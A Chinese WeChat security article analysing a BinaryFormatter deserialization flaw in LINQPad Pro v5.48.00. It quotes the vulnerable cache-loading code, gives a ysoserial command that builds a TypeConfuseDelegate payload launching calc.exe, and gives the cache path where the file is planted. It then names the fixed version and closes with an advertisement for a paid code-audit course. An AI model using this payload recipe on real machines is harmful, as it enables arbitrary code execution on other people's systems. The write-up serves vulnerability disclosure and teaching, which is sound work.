---
title: .NET LINQPad 最新反序列化漏洞分析与利用
url: https://mp.weixin.qq.com/s?__biz=MzUyOTc3NTQ5MA==&mid=2247497562&idx=3&sn=95e20ae2b522c3b6fad7bf80b1c3cf6e&chksm=fa5959b7cd2ed0a1411e8388beebdcf3e7a2b73a48db2a907bce388f08e5f8704dcc707a299e&scene=58&subscene=0#rd
source: dotNet安全矩阵
date: 2024-12-19
fetch_date: 2025-10-06T19:39:02.889602
---

# .NET LINQPad 最新反序列化漏洞分析与利用

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1Y8J0w4TbaDF1HpPAbnPzicV6JEJb0PnicY0TX5YJtickpTN0t3iarguppGbj2wKtctNwiaa2niaribDfFV8Q/0?wx_fmt=jpeg)

# .NET LINQPad 最新反序列化漏洞分析与利用

原创

专攻.NET安全的

dotNet安全矩阵

01

阅读须知

此文所提供的信息只为网络安全人员对自己所负责的网站、服务器等（包括但不限于）进行检测或维护参考，未经授权请勿利用文章中的技术资料对任何计算机系统进行入侵操作。利用此文所提供的信息而造成的直接或间接后果和损失，均由使用者本人负责。本文所提供的工具仅用于学习，禁止用于其他方面

02

漏洞背景

LINQPad 是一款广泛使用的 .NET 交互式编辑工具，尤其在开发和调试 LINQ 查询时被很多研发高度依赖。然而，在 LINQPad v5.48.00（专业版）中，存在一个严重的 反序列化漏洞，攻击者可利用该漏洞实现任意代码执行。这个漏洞的根源在于不安全地使用 BinaryFormatter 对外部输入数据进行反序列化。

![](https://mmbiz.qpic.cn/mmbiz_png/NO8Q9ApS1Y8J0w4TbaDF1HpPAbnPzicV61VOZprtAVe2dh9aKskMQzItdw0N3WEOhFnic1XBDfrriaxEL9MU9xdEA/640?wx_fmt=png&from=appmsg)

03

漏洞原理

LINQPad 反序列化漏洞 AutoRefManager 类的 PopulateFromCache 方法被 AutoRefManager.Initialize 调用。在此方法中，LINQPad 会从磁盘路径 %localappdata%\LINQPad\AutoRefCache46.1.dat 加载缓存数据。以下是核心代码的关键部分：

```
```
private static bool PopulateFromCache()
{
    if (!File.Exists(AutoRefManager._cachePath))
        return false;

    try
    {
        Dictionary<string, string[]> dictionary;
        using (FileStream serializationStream = File.OpenRead(AutoRefManager._cachePath))
            dictionary = (Dictionary<string, string[]>) new BinaryFormatter().Deserialize((Stream) serializationStream);

        if (dictionary == null)
            return false;

        // 数据处理逻辑
        TypeResolver.AutoRefCaseLookup = dictionary.Keys.ToLookup<string, string>(s => s, StringComparer.OrdinalIgnoreCase);
        TypeResolver.AutoRefLookup = AutoRefManager._refLookup = dictionary;
        return true;
    }
    catch
    {
        return false;
    }
}
```
```

LINQPad 从固定路径 %localappdata%\LINQPad\AutoRefCache46.1.dat 加载反序列化数据。攻击者只需将恶意构造的 AutoRefCache46.1.dat 文件放入此目录，再经过 BinaryFormatter.Deserialize 方法会对外部输入的二进制数据进行反序列化，而没有对输入数据进行验证。这使得攻击者可以构造恶意的二进制数据，利用反序列化触发任意代码执行。

03

漏洞利用

利用反序列化漏洞，攻击者可借助 ysoserial 工具构造恶意负载。ysoserial 是一个专门用来生成反序列化攻击有效负载的工具。

## 3.1 生成Payload

生成Payload使用 ysoserial 工具生成 BinaryFormatter 格式的有效负载，指定执行 calc.exe：

```
```
ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -c calc.exe -o raw > e:\AutoRefCache46.1.dat
```
```

指定反序列化格式为 BinaryFormatter，利用 TypeConfuseDelegate 触发任意代码执行。

## 3.2 复制文件到缓存目录

将生成的 AutoRefCache46.1.dat 文件复制到受影响的路径，具体如下所示。

```
```
%localappdata%\LINQPad\AutoRefCache46.1.dat
```
```

![](https://mmbiz.qpic.cn/mmbiz_png/NO8Q9ApS1Y8J0w4TbaDF1HpPAbnPzicV6sYRBy9aQEJ6cz51stHKdxXw8Nia0toVGe3nTn3IiauwLTvWfqgBHvVqg/640?wx_fmt=png&from=appmsg)

启动 LINQPad 专业版，触发 AutoRefManager.PopulateFromCache 方法，反序列化恶意数据，执行 calc.exe，如下图所示。

![](https://mmbiz.qpic.cn/mmbiz_png/NO8Q9ApS1Y8J0w4TbaDF1HpPAbnPzicV6wQnqEna0OiaCW02F0uG8Wn7g9K0v2jHFUvaXtDQawGxRre2v3vu90Yg/640?wx_fmt=png&from=appmsg)

04

漏洞修复

该漏洞已在 LINQPad v5.52.01 中修复，用户应尽快将 LINQPad 升级到最新版本（v5.52.01 及以上），以避免该漏洞被利用。值得注意的是，漏洞不影响免费版及未经授权的版本，也因此我们测试的时候本地安装的是免费版本，因此未触发漏洞。如下图所示。

![](https://mmbiz.qpic.cn/mmbiz_png/NO8Q9ApS1Y8J0w4TbaDF1HpPAbnPzicV6h0iagdLtg9dWriaiaWqnJtq3icSYLsmdx4N5hCx3ickNw4ibBmibTJ5USEF7g/640?wx_fmt=png&from=appmsg)

05

.NET代码审计

造成 LINQPad 出现反序列化漏洞的敏感函数，我们dot.Net安全代码审计星球视频课程早已覆盖，内容上包括但不限于OWASP十大漏洞类型，涉及SQL注入漏洞、文件上传下载漏洞、任意文件操作漏洞、XML外部实体注入漏洞、跨站脚本攻击漏洞、反序列化漏洞、命令执行漏洞、未授权和越权漏洞、第三方组件漏洞等等。

![](https://mmbiz.qpic.cn/mmbiz_png/NO8Q9ApS1Y8fTUcmnHC8g2WjE6SZJIjwMahhN19jbtUiax5UWVU0R3n4eick9XQEHyf3lhjE3wvCic9ZFD3h9tWsQ/640?wx_fmt=other&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

截至目前，星球已推出近**100节内容**(还在持续增加)，**包括70个视频+30份PDF文档**。我们已将内容细致划分为15个分类，并随新漏洞类型的出现持续扩展。

同时，为助力零基础新人轻松踏入.NET代码审计的殿堂，精心准备配备了一套《.NET安全基础入门》星球，**加入代码审计后赠送该星球永久免费学习**。星球内容覆盖广泛，以**视频讲解的方式**作为主要学习桥梁。

从.NET的基本概念、环境搭建讲起，逐步深入到编程语言、类库使用、面向对象编程、异常处理、文件操作等关键知识点。通过系统而全面的讲解，让初学者从零开始，逐步掌握.NET框架的核心概念、基本原理及实践技能。

![](https://mmbiz.qpic.cn/mmbiz_png/NO8Q9ApS1Y8fTUcmnHC8g2WjE6SZJIjwyhqLldZDia4a2CTDIdtI1K2htMYsiaEEXWVCjmtkvRlDwzGaYtf5D8YA/640?wx_fmt=other&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

**1. 学习模式:**代码审计知识星球**在线录播视频** +后续漏洞挖掘直播、内部专属交流社区答疑解惑；

**2. 优享福利：**加入.NET代码审计星球后**赠送永久**dot.Net安全基础入门星球。

![](https://mmbiz.qpic.cn/mmbiz_png/NO8Q9ApS1YibkE3ACnPUtfbn99XZmI6ANI9DCxS2KHkqiaXBk22ZevuRm08onmEibIUvdEy5zJGCoHg4HAsrgQ22w/640?wx_fmt=other&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

欢迎对.NET代码审计关注和关心的同学加入我们 [dot.Net安全代码审计] ，目前已有近 100+ 位朋友抢先预定。

![](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1YibEfvTKP231YekyMbc9jeicFuh0aAYDSicAg36pkFaC2P1KW0L5NV1HOssmysrPnrP1fzr2rFOmy8lA/640?wx_fmt=other&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

星球门票后期价格随着内容和质量的不断沉淀会适当提高，**越早加入越划算！** 现在加入星球可享受星球**早鸟价**，并可领取**100元优惠券**，期待在这里能遇到有情有义的小伙伴，大家聚在一起做一件有意义的事，**可****扫描下方老师二维码了解更多详情。**

![](https://mmbiz.qpic.cn/mmbiz_png/NO8Q9ApS1YibkE3ACnPUtfbn99XZmI6ANBJ4t8XC4ibbWjhzj0447zAJcWgwV9wcDhcibNiax3P7iagSYwn31GEkTBw/640?wx_fmt=other&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/NO8Q9ApS1Y8uc3CokHvGlrE00icPjW7AdTgEXkDtRT81Bbiaibx9gpMD6thAiawO5vz0icNlUzrzaOf6g044Tnzv3sQ/0?wx_fmt=png)

dotNet安全矩阵

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/NO8Q9ApS1Y8uc3CokHvGlrE00icPjW7AdTgEXkDtRT81Bbiaibx9gpMD6thAiawO5vz0icNlUzrzaOf6g044Tnzv3sQ/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过